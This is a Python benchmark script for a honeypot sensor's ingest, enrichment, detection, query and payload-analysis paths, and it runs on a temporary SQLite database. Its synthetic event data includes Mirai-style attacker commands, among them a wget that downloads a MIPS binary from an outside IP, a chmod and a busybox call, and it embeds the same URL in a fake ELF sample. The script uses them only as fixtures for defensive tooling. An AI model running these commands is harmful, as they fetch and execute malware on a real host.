"""Benchmark the paths that decide whether this system keeps up.

    python -m tools.benchmark                    # everything, default sizes
    python -m tools.benchmark --only ingest,query
    python -m tools.benchmark --events 50000 --json results.json

**This never touches your real database.** Every run builds a throwaway SQLite
file in a temp directory and points ``DATABASE_URL`` at it for the duration. A
benchmark that writes half a million synthetic events into a live sensor's
store would destroy the thing the sensor exists to collect, so the default is
not "be careful", it is "cannot happen".

What is measured, and why each one is here:

``ingest``
    The sensor's hot path — ``EventLogger.emit`` through the queue, the
    batching writer and into the database. This is the number that decides
    whether a burst gets captured or dropped: the queue is bounded, and once
    it fills, ``emit`` drops events rather than blocking the protocol handler.
``enrich``
    Per-event geo/ASN/threat-intel work. It runs inside the writer thread, so
    it is a direct tax on ingest throughput.
``detect``
    Rule evaluation over a window of events. Runs on a timer, so what matters
    is whether one pass finishes well inside its interval.
``query``
    The dashboard's endpoints. Reported as latency percentiles rather than a
    rate, because a p95 is what an analyst actually experiences.
``analyse``
    Static payload analysis, per artefact.

Numbers from one machine mean little in isolation. They are useful as a
before/after when you change something, and as an early warning when a number
moves by an order of magnitude.
"""

from __future__ import annotations

import argparse
import json
import os
import random
import sys
import tempfile
import time
import uuid
from collections.abc import Callable
from contextlib import contextmanager
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

BENCHMARKS = ("ingest", "enrich", "detect", "query", "analyse", "rebuild")


# --------------------------------------------------------------------------- #
# Result plumbing
# --------------------------------------------------------------------------- #


@dataclass
class Result:
    name: str
    n: int
    seconds: float
    unit: str = "ops"
    note: str = ""
    samples: list[float] = field(default_factory=list)

    @property
    def per_second(self) -> float:
        return self.n / self.seconds if self.seconds > 0 else float("inf")

    @property
    def percentiles(self) -> dict[str, float]:
        """p50/p95/p99 in milliseconds, for the latency-shaped benchmarks."""
        if not self.samples:
            return {}
        ordered = sorted(self.samples)

        def pick(q: float) -> float:
            index = min(len(ordered) - 1, int(q * len(ordered)))
            return ordered[index] * 1000

        return {"p50": pick(0.50), "p95": pick(0.95), "p99": pick(0.99)}

    def as_dict(self) -> dict[str, Any]:
        out: dict[str, Any] = {
            "name": self.name,
            "n": self.n,
            "seconds": round(self.seconds, 4),
            "per_second": round(self.per_second, 1),
            "unit": self.unit,
        }
        if self.note:
            out["note"] = self.note
        if self.percentiles:
            out["latency_ms"] = {k: round(v, 3) for k, v in self.percentiles.items()}
        return out


@contextmanager
def temp_database():
    """A throwaway SQLite database, active for the duration of the block."""
    from storage.db import get_engine, init_db, reset_state

    previous = os.environ.get("DATABASE_URL")
    with tempfile.TemporaryDirectory(prefix="honeypot-bench-") as tmp:
        os.environ["DATABASE_URL"] = f"sqlite:///{(Path(tmp) / 'bench.db').as_posix()}"
        reset_state()
        init_db(get_engine())
        try:
            yield Path(tmp)
        finally:
            reset_state()
            if previous is None:
                os.environ.pop("DATABASE_URL", None)
            else:
                os.environ["DATABASE_URL"] = previous


# --------------------------------------------------------------------------- #
# Synthetic data
# --------------------------------------------------------------------------- #

# Public ranges on purpose: ipaddress treats the RFC 5737 documentation blocks
# as private, and enrichment short-circuits on private addresses — seeding with
# 203.0.113.x would benchmark the early-return instead of the real work.
BENCH_IPS = [f"45.33.{a}.{b}" for a in range(1, 9) for b in range(1, 33)]
USERNAMES = ["root", "admin", "user", "oracle", "pi", "ubuntu", "test", "deploy"]
PASSWORDS = ["123456", "admin", "root", "password", "toor", "12345678", "qwerty"]
COMMANDS = [
    "uname -a",
    "cat /proc/cpuinfo",
    "wget http://45.33.32.9/bins/x.mips -O /tmp/x",
    "chmod +x /tmp/x",
    "/bin/busybox MIRAI",
]


def make_event_dict(rng: random.Random, ts, sensor: str = "bench") -> dict[str, Any]:
    """One event shaped the way a service emits it, before enrichment."""
    from storage.models import EventType, Severity

    service = rng.choice(["ssh", "telnet", "http", "redis", "ftp"])
    return {
        "event_id": str(uuid.uuid4()),
        "ts": ts,
        "sensor": sensor,
        "session_id": None,
        "service": service,
        "event_type": rng.choice(
            [EventType.AUTH_ATTEMPT.value, EventType.COMMAND.value, EventType.CONNECT.value]
        ),
        "severity": rng.choice([Severity.LOW.value, Severity.MEDIUM.value, Severity.HIGH.value]),
        "src_ip": rng.choice(BENCH_IPS),
        "src_port": rng.randint(1024, 65535),
        "dst_port": 22,
        "username": rng.choice(USERNAMES),
        "password": rng.choice(PASSWORDS),
        "command": rng.choice(COMMANDS),
        "user_agent": rng.choice(["curl/7.81.0", "Mozilla/5.0", "zgrab/0.x", "masscan/1.3"]),
        "tags": [],
        "threat_tags": [],
        "extra": {},
    }


def seed_events(count: int, *, seed: int = 7, hours: float = 24) -> int:
    """Bulk-insert ``count`` events. Returns how many landed."""
    import datetime as dt

    from storage.db import session_scope
    from storage.models import Event, utcnow

    rng = random.Random(seed)
    start = utcnow() - dt.timedelta(hours=hours)
    step = dt.timedelta(hours=hours) / max(count, 1)

    written = 0
    # Chunked so a large seed does not build one enormous transaction.
    for offset in range(0, count, 5000):
        chunk = min(5000, count - offset)
        with session_scope() as db:
            db.add_all(
                [Event(**make_event_dict(rng, start + step * (offset + i))) for i in range(chunk)]
            )
        written += chunk
    return written


# --------------------------------------------------------------------------- #
# Benchmarks
# --------------------------------------------------------------------------- #


def bench_ingest(count: int, *, enrich: bool = False) -> Result:
    """EventLogger.emit through the queue and batching writer into the DB."""
    import datetime as dt

    from honeypot.config import Settings
    from honeypot.logger import EventLogger
    from storage.models import utcnow

    settings = Settings(
        write_to_db=True,
        enrich_inline=enrich,
        jsonl_path=None,
        capture_payloads=False,
        sensor_name="bench",
    )
    logger = EventLogger(settings)
    rng = random.Random(11)
    base = utcnow() - dt.timedelta(hours=1)
    events = [make_event_dict(rng, base + dt.timedelta(milliseconds=i)) for i in range(count)]

    logger.start()
    start = time.perf_counter()
    for event in events:
        logger.emit(event)
    logger.stop()  # blocks until the queue is drained and written
    elapsed = time.perf_counter() - start

    note = f"{logger.written} written, {logger.dropped} dropped"
    if logger.dropped:
        note += "  <-- queue overflow"
    return Result(
        "ingest+enrich" if enrich else "ingest",
        count,
        elapsed,
        unit="events",
        note=note,
    )


def bench_enrich(count: int) -> Result:
    """Per-event enrichment, the tax paid inside the writer thread."""
    import datetime as dt

    from pipeline.enrichment import enrich_event
    from storage.models import utcnow

    rng = random.Random(13)
    base = utcnow() - dt.timedelta(hours=1)
    events = [make_event_dict(rng, base) for _ in range(count)]

    start = time.perf_counter()
    for event in events:
        enrich_event(event)
    elapsed = time.perf_counter() - start
    return Result("enrich", count, elapsed, unit="events")


def bench_detect(event_count: int) -> Result:
    """One full detection pass over the seeded window."""
    from pipeline.detection.rules import load_rules, run_detection
    from storage.db import session_scope

    rules = load_rules()
    start = time.perf_counter()
    with session_scope() as db:
        stats = run_detection(db, since_hours=48, rules=rules)
    elapsed = time.perf_counter() - start
    return Result(
        "detect",
        stats["events_evaluated"] or event_count,
        elapsed,
        unit="events",
        note=f"{len(rules)} rules, {stats['alerts_generated']} alerts",
    )


def bench_queries(repeats: int) -> list[Result]:
    """Dashboard endpoints, reported as latency percentiles."""
    from storage import queries
    from storage.db import session_scope

    cases: list[tuple[str, Callable[[Any], Any]]] = [
        ("query:summary", lambda db: queries.summary_stats(db, since_hours=24)),
        ("query:events", lambda db: queries.list_events(db, limit=100, since_hours=24)),
        ("query:attackers", lambda db: queries.list_attackers(db, limit=50)),
        ("query:timeseries", lambda db: queries.events_timeseries(db, since_hours=24)),
        ("query:top_creds", lambda db: queries.credential_pairs(db, limit=100)),
        ("query:sessions", lambda db: queries.list_sessions(db, limit=50)),
    ]

    results: list[Result] = []
    with session_scope() as db:
        for name, call in cases:
            call(db)  # warm up: first call pays for connection and query plan
            samples: list[float] = []
            for _ in range(repeats):
                started = time.perf_counter()
                call(db)
                samples.append(time.perf_counter() - started)
            results.append(Result(name, repeats, sum(samples), unit="calls", samples=samples))
    return results


def bench_analyse(count: int) -> Result:
    """Static analysis, per artefact."""
    import struct

    from pipeline.analysis.static import analyze

    header = bytearray(52)
    header[0:4] = b"\x7fELF"
    header[4], header[5], header[6], header[7] = 1, 2, 1, 3
    struct.pack_into(">HH", header, 16, 2, 0x08)
    body = b"/bin/busybox\x00http://45.33.32.9/bins/x.mips\x00" + bytes(range(256)) * 40
    sample = bytes(header) + body

    start = time.perf_counter()
    for _ in range(count):
        analyze(sample)
    elapsed = time.perf_counter() - start
    return Result("analyse", count, elapsed, unit="artefacts", note=f"{len(sample):,}B each")


def bench_rebuild() -> Result:
    """Recomputing the attacker aggregate from raw events."""
    from storage import queries
    from storage.db import session_scope

    start = time.perf_counter()
    with session_scope() as db:
        updated = queries.rebuild_attackers(db)
    elapsed = time.perf_counter() - start
    return Result("rebuild_attackers", updated, elapsed, unit="attackers")


# --------------------------------------------------------------------------- #
# Runner
# --------------------------------------------------------------------------- #


def run(
    selected: list[str],
    *,
    events: int,
    ingest_events: int,
    repeats: int,
    analyse_count: int,
) -> list[Result]:
    results: list[Result] = []

    with temp_database():
        if "ingest" in selected:
            results.append(bench_ingest(ingest_events, enrich=False))
            results.append(bench_ingest(ingest_events, enrich=True))
        if "enrich" in selected:
            results.append(bench_enrich(min(events, 20_000)))
        if "analyse" in selected:
            results.append(bench_analyse(analyse_count))

        needs_data = {"detect", "query", "rebuild"} & set(selected)
        if needs_data:
            seeded = time.perf_counter()
            written = seed_events(events)
            results.append(Result("seed", written, time.perf_counter() - seeded, unit="events"))
            if "rebuild" in selected:
                results.append(bench_rebuild())
            if "detect" in selected:
                results.append(bench_detect(events))
            if "query" in selected:
                results.extend(bench_queries(repeats))

    return results


def render_table(results: list[Result]) -> str:
    name_width = max((len(r.name) for r in results), default=12) + 2
    lines = [
        f"{'benchmark':<{name_width}}{'n':>9}  {'seconds':>8}  {'rate':>16}  "
        f"{'p50':>8}  {'p95':>8}   note",
        "-" * (name_width + 70),
    ]
    for r in results:
        pct = r.percentiles
        p50 = f"{pct['p50']:.2f}ms" if pct else ""
        p95 = f"{pct['p95']:.2f}ms" if pct else ""
        rate = f"{r.per_second:,.0f} {r.unit}/s"
        lines.append(
            f"{r.name:<{name_width}}{r.n:>9,}  {r.seconds:>8.3f}  {rate:>16}  "
            f"{p50:>8}  {p95:>8}   {r.note}"
        )
    return "\n".join(lines)


def main(argv: list[str] | None = None) -> int:
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except (AttributeError, ValueError):  # pragma: no cover
        pass

    parser = argparse.ArgumentParser(
        description="Benchmark ingest, enrichment, detection, queries and analysis."
    )
    parser.add_argument(
        "--only",
        help=f"comma-separated subset of: {','.join(BENCHMARKS)}",
    )
    parser.add_argument("--events", type=int, default=20_000, help="events to seed (default 20k)")
    parser.add_argument(
        "--ingest-events", type=int, default=5_000, help="events per ingest run (default 5k)"
    )
    parser.add_argument("--repeats", type=int, default=20, help="calls per query benchmark")
    parser.add_argument("--analyse", type=int, default=500, help="artefacts to analyse")
    parser.add_argument("--json", help="also write results to this file as JSON")
    args = parser.parse_args(argv)

    if args.only:
        selected = [s.strip() for s in args.only.split(",") if s.strip()]
        unknown = set(selected) - set(BENCHMARKS)
        if unknown:
            parser.error(f"unknown benchmark(s): {', '.join(sorted(unknown))}")
    else:
        selected = list(BENCHMARKS)

    results = run(
        selected,
        events=args.events,
        ingest_events=args.ingest_events,
        repeats=args.repeats,
        analyse_count=args.analyse,
    )

    print(render_table(results))

    if args.json:
        payload = {
            "python": sys.version.split()[0],
            "platform": sys.platform,
            "results": [r.as_dict() for r in results],
        }
        Path(args.json).write_text(json.dumps(payload, indent=2), encoding="utf-8")
        print(f"\nwrote {args.json}", file=sys.stderr)

    return 0


if __name__ == "__main__":
    sys.exit(main())


__all__ = ["run", "Result", "BENCHMARKS", "seed_events", "temp_database"]
